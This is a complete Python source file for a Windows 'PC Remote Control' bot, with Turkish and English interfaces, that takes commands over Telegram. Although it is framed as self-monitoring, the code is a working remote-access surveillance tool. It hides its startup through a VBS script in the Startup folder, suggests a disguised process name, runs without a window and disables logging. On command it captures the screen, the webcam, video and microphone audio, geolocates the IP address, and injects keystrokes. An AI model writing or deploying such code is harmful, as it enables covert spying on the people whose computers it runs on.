import os
import sys
import platform
import psutil
import shutil
import requests
import pyautogui
import cv2
import sounddevice as sd
import wmi
import logging
import asyncio
import winreg
import threading
import time
import json
import subprocess
import tkinter as tk
from tkinter import messagebox, scrolledtext
from tkinter import ttk
import webbrowser
from scipy.io.wavfile import write
from telegram import Update, InputFile
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters

# --- Sabitler ve Yollar ---
APP_NAME = "PC Remote Control"
TEMP_DIR = os.path.join(os.getenv('TEMP'), 'pc_safe_remote')
CONFIG_DIR = os.path.join(os.getenv('APPDATA'), APP_NAME)
CONFIG_FILE = os.path.join(CONFIG_DIR, 'settings.json')
PID_FILE = os.path.join(CONFIG_DIR, 'bot.pid')
# LOG_FILE iptal edildi

# Başlangıçta Temizlik: Varsa eski temp klasörünü silip yeniden oluştur
if os.path.exists(TEMP_DIR):
    try:
        shutil.rmtree(TEMP_DIR)
    except: pass

# Gerekli dizinleri oluştur
if not os.path.exists(TEMP_DIR):
    os.makedirs(TEMP_DIR)
if not os.path.exists(CONFIG_DIR):
    os.makedirs(CONFIG_DIR)

# --- Dil Paketi (Localization) ---
# Özel isimler (PC Remote Control, SystemSafeService vb.) çevrilmemiştir.
LANGUAGES = {
    "TR": {
        "gui_title": "PC UZAK KONTROL",
        "header": "🛡️ PC UZAK KONTROL",
        "lbl_token": "Telegram Bot Token:",
        "lbl_id": "Telegram User ID:",
        "lbl_name": "Arkaplan İşlem Adı (Örn: SystemSafeService):",
        "btn_help": "❓ Bu bilgileri nasıl bulurum?",
        "btn_save": "✅ Ayarları Kaydet ve Botu BAŞLAT",
        "btn_stop": "⛔ Botu DURDUR ve Kaldır",
        "lbl_status_wait": "Durum: Bekleniyor",
        "lbl_status_loaded": "Durum: Kayıtlı ayarlar yüklendi",
        "lbl_status_running": "Durum: Bot çalışıyor!",
        "lbl_status_stopped": "Durum: Bot durduruldu",
        "lbl_note": "Not: Başlattıktan sonra bu pencereyi kapatabilirsiniz.\nBot arka planda çalışmaya devam edecektir.",
        "msg_error": "Hata",
        "msg_success": "Başarılı",
        "msg_fill_all": "Lütfen tüm alanları doldurun!",
        "msg_started": "Bot başarıyla başlatıldı ve başlangıca eklendi.\nBu pencereyi kapatabilirsiniz.",
        "msg_stopped": "Bot durduruldu ve başlangıçtan silindi.",
        "msg_start_fail": "Bir sorun oluştu: {}",
        "msg_stop_fail": "Silme hatası: {}",
        "msg_no_file": "Başlangıç dosyası bulunamadı (zaten silinmiş olabilir).",
        "msg_name_warn": "İşlem adı bulunamadı, manuel temizleme gerekebilir.",
        
        "help_title": "Yardım - Token ve ID Bulma",
        "help_text": """
1. Telegram Bot Token Alma:
   - Telegram'da @BotFather'ı arayın ve başlatın.
   - /newbot komutunu gönderin.
   - Botunuz için bir isim ve kullanıcı adı belirleyin.
   - BotFather size uzun bir 'Token' verecektir. Onu kopyalayıp programa yapıştırın.

2. User ID Öğrenme:
   - Telegram'da @userinfobot veya @RawDataBot'u arayın ve başlatın.
   - Bot size 'Id' numaranızı gönderecektir (Örn: 123456789).
   - Bu numarayı kopyalayıp programa yapıştırın.

3. İşlem Adı:
   - Görev yöneticisinde veya başlangıçta görünmesini istediğiniz ismi yazın.
        """,

        # Bot Mesajları
        "bot_start": "🛡️ **PC Remote Control Aktif!**\n\nBu bot bilgisayarınızı uzaktan izlemek ve kontrol etmek için tasarlanmıştır.\nKomutları görmek için /yardim yazabilirsiniz.",
        "bot_help": """
📋 **Komut Listesi:**

📍 **İzleme:**
/ip - IP ve tahmini konum bilgisi
/durum - RAM, CPU ve Sıcaklık durumu
/uygulamalar - Aktif çalışan uygulamalar
/ekran - Anlık ekran görüntüsü

📸 **Medya:**
/foto - Webcam'den fotoğraf çek
/video <saniye> - Webcam'den video kaydet
/ses <saniye> - Ortam sesi kaydet

🎮 **Kontrol:**
/tus <tuslar> - Tuşa bas (örn: enter, alt+tab)
/yaz <metin> - Metin yazdır
/fare <yön> [px] - Fareyi hareket ettir
/kilitle - Oturumu kilitle
/kapat - Bilgisayarı kapat
        """,
        "bot_ip_wait": "⏳ Bilgiler alınıyor...",
        "bot_ip_title": "🌍 **Ağ Bilgileri**",
        "bot_sys_title": "📊 **Sistem Durumu**",
        "bot_apps_wait": "⏳ Taranıyor...",
        "bot_apps_title": "📱 **Aktif Uygulamalar:**",
        "bot_screen_err": "❌ Ekran görüntüsü alınamadı: {}",
        "bot_cam_wait": "📸 Çekiliyor...",
        "bot_cam_err": "❌ Kamera hatası.",
        "bot_vid_wait": "🎥 {} sn video...",
        "bot_vid_err": "❌ Video hatası.",
        "bot_aud_wait": "🎙️ {} sn ses...",
        "bot_aud_err": "❌ Ses hatası.",
        "bot_key_err": "❌ Tuş belirtin.",
        "bot_success": "✅ İşlem başarılı.",
        "bot_error": "❌ Hata: {}",
        "bot_auth_fail": "Yetkisiz erişim denemesi: {} ({})",
        "bot_locking": "🔒 Kilitlendi.",
        "bot_shutdown": "⚠️ Kapatılıyor..."
    },
    "EN": {
        "gui_title": "PC Remote Control",
        "header": "🛡️ PC Remote Control",
        "lbl_token": "Telegram Bot Token:",
        "lbl_id": "Telegram User ID:",
        "lbl_name": "Background Process Name (e.g. SystemSafeService):",
        "btn_help": "❓ How do I find these?",
        "btn_save": "✅ Save Settings & START Bot",
        "btn_stop": "⛔ STOP Bot & Uninstall",
        "lbl_status_wait": "Status: Waiting",
        "lbl_status_loaded": "Status: Saved settings loaded",
        "lbl_status_running": "Status: Bot is running!",
        "lbl_status_stopped": "Status: Bot stopped",
        "lbl_note": "Note: You can close this window after starting.\nThe bot will continue running in the background.",
        "msg_error": "Error",
        "msg_success": "Success",
        "msg_fill_all": "Please fill in all fields!",
        "msg_started": "Bot started successfully and added to startup.\nYou can close this window now.",
        "msg_stopped": "Bot stopped and removed from startup.",
        "msg_start_fail": "An error occurred: {}",
        "msg_stop_fail": "Deletion error: {}",
        "msg_no_file": "Startup file not found (might be already deleted).",
        "msg_name_warn": "Process name not found, manual cleanup might be needed.",
        
        "help_title": "Help - Finding Token & ID",
        "help_text": """
1. Getting Telegram Bot Token:
   - Search for @BotFather on Telegram and start it.
   - Send /newbot command.
   - Choose a name and username for your bot.
   - BotFather will give you a long 'Token'. Copy and paste it here.

2. Getting User ID:
   - Search for @userinfobot or @RawDataBot on Telegram.
   - The bot will send your 'Id' number (e.g. 123456789).
   - Copy and paste this number here.

3. Process Name:
   - Enter a name you want to appear in Task Manager or Startup.
        """,

        # Bot Messages
        "bot_start": "🛡️ **PC Remote Control Active!**\n\nThis bot is designed to monitor and control your PC remotely.\nType /help to see commands.",
        "bot_help": """
📋 **Command List:**

📍 **Monitoring:**
/ip - IP and location info
/status - RAM, CPU and Temp status
/apps - Active running apps
/screen - Instant screenshot

📸 **Media:**
/photo - Take photo from webcam
/video <seconds> - Record video from webcam
/audio <seconds> - Record ambient audio

🎮 **Control:**
/key <keys> - Press keys (e.g. enter, alt+tab)
/type <text> - Type text
/mouse <dir> [px] - Move mouse
/lock - Lock session
/shutdown - Shutdown PC
        """,
        "bot_ip_wait": "⏳ Fetching info...",
        "bot_ip_title": "🌍 **Network Info**",
        "bot_sys_title": "📊 **System Status**",
        "bot_apps_wait": "⏳ Scanning...",
        "bot_apps_title": "📱 **Active Apps:**",
        "bot_screen_err": "❌ Screenshot failed: {}",
        "bot_cam_wait": "📸 Capturing...",
        "bot_cam_err": "❌ Camera error.",
        "bot_vid_wait": "🎥 {}s video...",
        "bot_vid_err": "❌ Video error.",
        "bot_aud_wait": "🎙️ {}s audio...",
        "bot_aud_err": "❌ Audio error.",
        "bot_key_err": "❌ Specify a key.",
        "bot_success": "✅ Operation successful.",
        "bot_error": "❌ Error: {}",
        "bot_auth_fail": "Unauthorized access attempt: {} ({})",
        "bot_locking": "🔒 Locked.",
        "bot_shutdown": "⚠️ Shutting down..."
    }
}

# --- Loglama ---
# Log dosyasını devre dışı bırakıyoruz, sadece terminal (stderr) varsa oraya yazsın
# LOG_FILE = os.path.join(TEMP_DIR, 'bot_log.txt') # Bu satırı iptal ettik

handlers = [] # Dosyaya yazma yok
if sys.stderr:
    handlers.append(logging.StreamHandler())

# Eğer hiç handler yoksa NullHandler ekle ki hata vermesin
if not handlers:
    handlers.append(logging.NullHandler())

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=handlers
)

logger = logging.getLogger(__name__)

# --- Konfigürasyon Yönetimi ---
class ConfigManager:
    @staticmethod
    def save_config(token, user_id, process_name, language="EN"):
        data = {
            "bot_token": token,
            "user_id": int(user_id),
            "process_name": process_name,
            "language": language
        }
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4)


    @staticmethod
    def load_config():
        if not os.path.exists(CONFIG_FILE):
            return None
        try:
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Config okuma hatasi: {e}")
            return None

# --- Bot Mantığı ---
class BotService:
    def __init__(self, token, user_id, lang_code="EN"):
        self.token = token
        self.user_id = user_id
        self.lang_code = lang_code if lang_code in LANGUAGES else "EN"
        self.texts = LANGUAGES[self.lang_code]
        pyautogui.FAILSAFE = False

    def unauthorized_check(self, update: Update):
        user = update.effective_user
        if user.id != self.user_id:
            logger.warning(self.texts["bot_auth_fail"].format(user.id, user.username))
            return True
        return False

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if self.unauthorized_check(update): return
        await update.message.reply_text(self.texts["bot_start"])

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if self.unauthorized_check(update): return
        await update.message.reply_text(self.texts["bot_help"])

    async def get_ip_info(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if self.unauthorized_check(update): return
        await update.message.reply_text(self.texts["bot_ip_wait"])
        try:
            response = requests.get("http://ip-api.com/json/")
            data = response.json()
            msg = (f"{self.texts['bot_ip_title']}\n"
                   f"IP: `{data.get('query')}`\n"
                   f"Country: {data.get('country')}\nCity: {data.get('city')}\n"
                   f"ISP: {data.get('isp')}\n"
                   f"Map: https://www.google.com/maps/search/?api=1&query={data.get('lat')},{data.get('lon')}")
            await update.message.reply_text(msg, parse_mode='Markdown')
        except Exception as e:
            await update.message.reply_text(self.texts["bot_error"].format(e))

    async def system_status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if self.unauthorized_check(update): return
        cpu = psutil.cpu_percent(interval=1)
        ram = psutil.virtual_memory()
        temp_info = "N/A"
        try:
            w = wmi.WMI(namespace="root\\wmi")
            temps = w.MSAcpi_ThermalZoneTemperature()
            if temps:
                temp_c = (temps[0].CurrentTemperature / 10.0) - 273.15
                temp_info = f"{temp_c:.1f}°C"
        except: pass
        
        msg = (f"{self.texts['bot_sys_title']}\nCPU: %{cpu}\n"
               f"RAM: %{ram.percent} ({round(ram.used/1024**3,2)} GB / {round(ram.total/1024**3,2)} GB)\n"
               f"Temp: {temp_info}")
        await update.message.reply_text(msg)

    async def active_apps(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if self.unauthorized_check(update): return
        await update.message.reply_text(self.texts["bot_apps_wait"])
        apps = []
        try:
            for proc in psutil.process_iter(['name', 'username']):
                try:
                    if proc.info['username']: apps.append(proc.info['name'])
                except: pass
        except: pass
        apps = sorted(list(set(apps)))
        app_str = ", ".join(apps[:50])
        if len(apps) > 50: app_str += f"\n... (+{len(apps)-50})"
        await update.message.reply_text(f"{self.texts['bot_apps_title']}\n{app_str}")

    async def screenshot(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if self.unauthorized_check(update): return
        path = os.path.join(TEMP_DIR, "screenshot.png")
        try:
            pyautogui.screenshot().save(path)
            await update.message.reply_photo(photo=open(path, 'rb'))
            # Gönderdikten sonra sil
            if os.path.exists(path): os.remove(path)
        except Exception as e:
            await update.message.reply_text(self.texts["bot_screen_err"].format(e))

    async def capture_photo(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if self.unauthorized_check(update): return
        await update.message.reply_text(self.texts["bot_cam_wait"])
        def _task():
            cap = cv2.VideoCapture(0)
            if not cap.isOpened(): return None
            for _ in range(15): cap.read()
            ret, frame = cap.read()
            path = os.path.join(TEMP_DIR, "cam_photo.jpg")
            if ret: cv2.imwrite(path, frame)
            cap.release()
            return path if ret else None
        
        path = await asyncio.to_thread(_task)
        if path: 
            await update.message.reply_photo(photo=open(path, 'rb'))
            # Gönderdikten sonra sil
            if os.path.exists(path): os.remove(path)
        else: await update.message.reply_text(self.texts["bot_cam_err"])

    async def capture_video(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if self.unauthorized_check(update): return
        sec = int(context.args[0]) if context.args else 5
        if sec > 60: sec = 60
        await update.message.reply_text(self.texts["bot_vid_wait"].format(sec))
        
        def _task(dur):
            cap = cv2.VideoCapture(0)
            if not cap.isOpened(): return None
            path = os.path.join(TEMP_DIR, "cam_video.avi")
            out = cv2.VideoWriter(path, cv2.VideoWriter_fourcc(*'XVID'), 20.0, (int(cap.get(3)), int(cap.get(4))))
            start = time.time()
            while (time.time() - start) < dur:
                ret, frame = cap.read()
                if ret: out.write(frame)
                else: break
            cap.release()
            out.release()
            return path

        path = await asyncio.to_thread(_task, sec)
        if path: 
            await update.message.reply_video(video=open(path, 'rb'))
            # Gönderdikten sonra sil
            if os.path.exists(path): os.remove(path)
        else: await update.message.reply_text(self.texts["bot_vid_err"])

    async def record_audio(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if self.unauthorized_check(update): return
        sec = int(context.args[0]) if context.args else 5
        if sec > 60: sec = 60
        await update.message.reply_text(self.texts["bot_aud_wait"].format(sec))
        path = os.path.join(TEMP_DIR, "audio.wav")
        
        def _task(dur):
            try:
                rec = sd.rec(int(dur * 44100), samplerate=44100, channels=2)
                sd.wait()
                write(path, 44100, rec)
                return True
            except: return False
            
        if await asyncio.to_thread(_task, sec):
            await update.message.reply_audio(audio=open(path, 'rb'))
            # Gönderdikten sonra sil
            if os.path.exists(path): os.remove(path)
        else: await update.message.reply_text(self.texts["bot_aud_err"])

    async def press_key(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if self.unauthorized_check(update): return
        if not context.args: return await update.message.reply_text(self.texts["bot_key_err"])
        keys = " ".join(context.args).split('+') if '+' in " ".join(context.args) else context.args
        try:
            if len(keys) > 1: pyautogui.hotkey(*[k.strip() for k in keys])
            else: pyautogui.press(keys[0])
            await update.message.reply_text(self.texts["bot_success"])
        except Exception as e: await update.message.reply_text(self.texts["bot_error"].format(e))

    async def type_text(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if self.unauthorized_check(update): return
        text = " ".join(context.args)
        if text: 
            pyautogui.write(text)
            await update.message.reply_text(self.texts["bot_success"])

    async def mouse_control(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if self.unauthorized_check(update): return
        if not context.args: return await update.message.reply_text(self.texts["bot_key_err"]) # Yön için de aynı hata
        d = context.args[0].lower()
        dist = int(context.args[1]) if len(context.args) > 1 else 50
        try:
            if d in ['yukarı', 'up', 'u']: pyautogui.moveRel(0, -dist)
            elif d in ['aşağı', 'down', 'd']: pyautogui.moveRel(0, dist)
            elif d in ['sol', 'left', 'l']: pyautogui.moveRel(-dist, 0)
            elif d in ['sağ', 'right', 'r']: pyautogui.moveRel(dist, 0)
            await update.message.reply_text(self.texts["bot_success"])
        except: await update.message.reply_text(self.texts["bot_error"].format("Mouse Error"))

    async def lock_pc(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if self.unauthorized_check(update): return
        os.system("rundll32.exe user32.dll,LockWorkStation")
        await update.message.reply_text(self.texts["bot_locking"])

    async def shutdown_pc(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if self.unauthorized_check(update): return
        await update.message.reply_text(self.texts["bot_shutdown"])
        os.system("shutdown /s /t 5")

    def run(self):
        app = ApplicationBuilder().token(self.token).build()
        # Komutları dil farketmeksizin standart (ingilizce komutlar) ve türkçe alternatiflerle ekleyebiliriz
        cmds = {
            "start": self.start, "yardim": self.help_command, "help": self.help_command,
            "ip": self.get_ip_info, "durum": self.system_status, "status": self.system_status,
            "uygulamalar": self.active_apps, "apps": self.active_apps,
            "ekran": self.screenshot, "screen": self.screenshot,
            "foto": self.capture_photo, "photo": self.capture_photo,
            "video": self.capture_video, "ses": self.record_audio, "audio": self.record_audio,
            "tus": self.press_key, "key": self.press_key,
            "yaz": self.type_text, "type": self.type_text,
            "fare": self.mouse_control, "mouse": self.mouse_control,
            "kilitle": self.lock_pc, "lock": self.lock_pc,
            "kapat": self.shutdown_pc, "shutdown": self.shutdown_pc
        }
        
        for cmd, func in cmds.items():
            app.add_handler(CommandHandler(cmd, func))
        
        with open(PID_FILE, 'w') as f:
            f.write(str(os.getpid()))
            
        logger.info(f"Bot başlatıldı (Dil: {self.lang_code})")
        app.run_polling()

# --- GUI ---
class BotGUI:
    def __init__(self, root):
        self.root = root
        self.current_lang = "EN" # Varsayılan
        self.root.geometry("500x650")
        self.root.resizable(False, False)
        
        style = ttk.Style()
        style.configure('TButton', font=('Arial', 10))
        style.configure('TLabel', font=('Arial', 10))
        
        self.create_widgets()
        self.load_existing_config()

    def create_widgets(self):
        self.main_frame = ttk.Frame(self.root, padding="20")
        self.main_frame.pack(fill=tk.BOTH, expand=True)

        # Dil Seçimi
        top_frame = ttk.Frame(self.main_frame)
        top_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(top_frame, text="Language / Dil:").pack(side=tk.RIGHT, padx=5)
        self.lang_var = tk.StringVar(value="English")
        self.lang_combo = ttk.Combobox(top_frame, textvariable=self.lang_var, values=["English", "Türkçe"], state="readonly", width=10)
        self.lang_combo.pack(side=tk.RIGHT)
        self.lang_combo.bind("<<ComboboxSelected>>", self.on_lang_change)

        # Başlık
        self.lbl_header = ttk.Label(self.main_frame, text="", font=('Arial', 16, 'bold'))
        self.lbl_header.pack(pady=10)

        # Token Girişi
        self.lbl_token = ttk.Label(self.main_frame, text="")
        self.lbl_token.pack(anchor='w', pady=(10,0))
        self.token_entry = ttk.Entry(self.main_frame, width=50)
        self.token_entry.pack(fill=tk.X, pady=5)
        
        # ID Girişi
        self.lbl_id = ttk.Label(self.main_frame, text="")
        self.lbl_id.pack(anchor='w', pady=(10,0))
        self.id_entry = ttk.Entry(self.main_frame, width=50)
        self.id_entry.pack(fill=tk.X, pady=5)

        # Process Adı Girişi
        self.lbl_name = ttk.Label(self.main_frame, text="")
        self.lbl_name.pack(anchor='w', pady=(10,0))
        self.name_entry = ttk.Entry(self.main_frame, width=50)
        self.name_entry.insert(0, "SystemSafeService")
        self.name_entry.pack(fill=tk.X, pady=5)

        # Bilgi / Yardım Butonu
        self.btn_help = ttk.Button(self.main_frame, text="", command=self.show_help)
        self.btn_help.pack(pady=5, anchor='e')

        # Ayırıcı
        ttk.Separator(self.main_frame, orient='horizontal').pack(fill=tk.X, pady=20)

        # Butonlar
        self.status_label = ttk.Label(self.main_frame, text="", foreground="gray")
        self.status_label.pack(pady=5)

        self.btn_save = ttk.Button(self.main_frame, text="", command=self.save_and_start)
        self.btn_save.pack(fill=tk.X, pady=10)
        
        self.btn_stop = ttk.Button(self.main_frame, text="", command=self.stop_and_uninstall)
        self.btn_stop.pack(fill=tk.X, pady=10)

        # Alt Bilgi
        self.lbl_note = ttk.Label(self.main_frame, text="", font=('Arial', 8), foreground='gray', justify='center')
        self.lbl_note.pack(pady=20)
        
        self.update_ui_text()

    def on_lang_change(self, event=None):
        selection = self.lang_var.get()
        self.current_lang = "TR" if selection == "Türkçe" else "EN"
        self.update_ui_text()

    def update_ui_text(self):
        t = LANGUAGES[self.current_lang]
        self.root.title(t["gui_title"])
        self.lbl_header.config(text=t["header"])
        self.lbl_token.config(text=t["lbl_token"])
        self.lbl_id.config(text=t["lbl_id"])
        self.lbl_name.config(text=t["lbl_name"])
        self.btn_help.config(text=t["btn_help"])
        self.btn_save.config(text=t["btn_save"])
        self.btn_stop.config(text=t["btn_stop"])
        
        # Status label update
        if "Durum" in self.status_label.cget("text") or "Status" in self.status_label.cget("text"):
             self.status_label.config(text=t["lbl_status_wait"])

        self.lbl_note.config(text=t["lbl_note"])

    def show_help(self):
        t = LANGUAGES[self.current_lang]
        help_win = tk.Toplevel(self.root)
        help_win.title(t["help_title"])
        help_win.geometry("450x450")
        
        txt = scrolledtext.ScrolledText(help_win, wrap=tk.WORD, width=50, height=25)
        txt.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)
        
        txt.insert(tk.END, t["help_text"])
        txt.config(state=tk.DISABLED)

    def load_existing_config(self):
        conf = ConfigManager.load_config()
        if conf:
            self.token_entry.insert(0, conf.get('bot_token', ''))
            self.id_entry.insert(0, str(conf.get('user_id', '')))
            self.name_entry.delete(0, tk.END)
            self.name_entry.insert(0, conf.get('process_name', 'SystemSafeService'))
            
            saved_lang = conf.get('language', 'EN')
            self.current_lang = saved_lang
            self.lang_var.set("Türkçe" if saved_lang == "TR" else "English")
            self.update_ui_text()
            
            t = LANGUAGES[self.current_lang]
            self.status_label.config(text=t["lbl_status_loaded"], foreground="blue")

    def save_and_start(self):
        t = LANGUAGES[self.current_lang]
        token = self.token_entry.get().strip()
        uid = self.id_entry.get().strip()
        pname = self.name_entry.get().strip()

        if not token or not uid or not pname:
            messagebox.showerror(t["msg_error"], t["msg_fill_all"])
            return

        try:
            ConfigManager.save_config(token, uid, pname, self.current_lang)
            self.create_startup_vbs(pname)
            self.launch_bot_process()
            
            self.status_label.config(text=t["lbl_status_running"], foreground="green")
            messagebox.showinfo(t["msg_success"], t["msg_started"])
            
        except Exception as e:
            messagebox.showerror(t["msg_error"], t["msg_start_fail"].format(e))

    def create_startup_vbs(self, process_name):
        startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        if not os.path.exists(startup_folder):
            os.makedirs(startup_folder)
            
        script_path = os.path.abspath(sys.argv[0]) 
        vbs_target = os.path.join(startup_folder, f"{process_name}.vbs")
        
        vbs_content = f'Set WshShell = CreateObject("WScript.Shell")\n'
        
        if getattr(sys, 'frozen', False):
             # EXE olarak çalışıyorsa
            vbs_content += f'command = Chr(34) & "{script_path}" & Chr(34) & " --run-bot"\n'
        else:
             # Python scripti olarak çalışıyorsa
            vbs_content += f'command = "python " & Chr(34) & "{script_path}" & Chr(34) & " --run-bot"\n'
            
        vbs_content += f'WshShell.Run command, 0, False'
        
        with open(vbs_target, "w", encoding="utf-8") as f:
            f.write(vbs_content)
        return vbs_target

    def launch_bot_process(self):
        if os.path.exists(PID_FILE):
            try:
                with open(PID_FILE, 'r') as f:
                    pid = int(f.read().strip())
                if psutil.pid_exists(pid):
                    psutil.Process(pid).terminate()
            except: pass

        if getattr(sys, 'frozen', False):
            subprocess.Popen([sys.executable, "--run-bot"], 
                             creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            subprocess.Popen([sys.executable, sys.argv[0], "--run-bot"], 
                             creationflags=subprocess.CREATE_NO_WINDOW)

    def stop_and_uninstall(self):
        t = LANGUAGES[self.current_lang]
        pname = self.name_entry.get().strip()
        if not pname:
            conf = ConfigManager.load_config()
            if conf: pname = conf.get('process_name', '')
        
        if not pname:
            messagebox.showwarning(t["msg_error"], t["msg_name_warn"])
            return

        if os.path.exists(PID_FILE):
            try:
                with open(PID_FILE, 'r') as f:
                    pid = int(f.read().strip())
                if psutil.pid_exists(pid):
                    psutil.Process(pid).terminate()
                os.remove(PID_FILE)
            except Exception as e:
                logger.error(f"Durdurma hatası: {e}")

        # Config klasörünü tamamen sil (içindeki settings vb. dahil)
        if os.path.exists(CONFIG_DIR):
            try:
                shutil.rmtree(CONFIG_DIR)
            except Exception as e:
                logger.error(f"Klasör silme hatası: {e}")

        # Temp klasörünü tamamen sil (Loglar ve geçici dosyalar)
        if os.path.exists(TEMP_DIR):
            try:
                shutil.rmtree(TEMP_DIR)
            except Exception as e:
                logger.error(f"Temp silme hatası: {e}")

        startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        vbs_target = os.path.join(startup_folder, f"{pname}.vbs")
        
        # GUI güncelleme ve bildirim
        success = False
        if os.path.exists(vbs_target):
            try:
                os.remove(vbs_target)
                success = True
            except Exception as e:
                messagebox.showerror(t["msg_error"], t["msg_stop_fail"].format(e))
        else:
            # VBS yoksa bile config silindiği için başarılı sayılabilir
            if not success and not os.path.exists(CONFIG_DIR):
                 success = True

        if success:
            messagebox.showinfo(t["msg_success"], t["msg_stopped"])
            self.status_label.config(text=t["lbl_status_stopped"], foreground="red")
            # Form alanlarını temizle
            self.token_entry.delete(0, tk.END)
            self.id_entry.delete(0, tk.END)
            self.name_entry.delete(0, tk.END)
            self.name_entry.insert(0, "SystemSafeService")
        elif not os.path.exists(vbs_target):
             messagebox.showinfo(t["msg_error"], t["msg_no_file"])

# --- Main ---
def main():
    if "--run-bot" in sys.argv:
        conf = ConfigManager.load_config()
        if conf:
            try:
                # Bot dilini config'den oku, yoksa EN
                lang = conf.get('language', 'EN')
                bot = BotService(conf['bot_token'], conf['user_id'], lang)
                bot.run()
            except Exception as e:
                logger.error(f"Bot başlatma hatası: {e}")
        else:
            logger.error("Config bulunamadı!")
    else:
        root = tk.Tk()
        app = BotGUI(root)
        root.mainloop()

if __name__ == '__main__':
    main()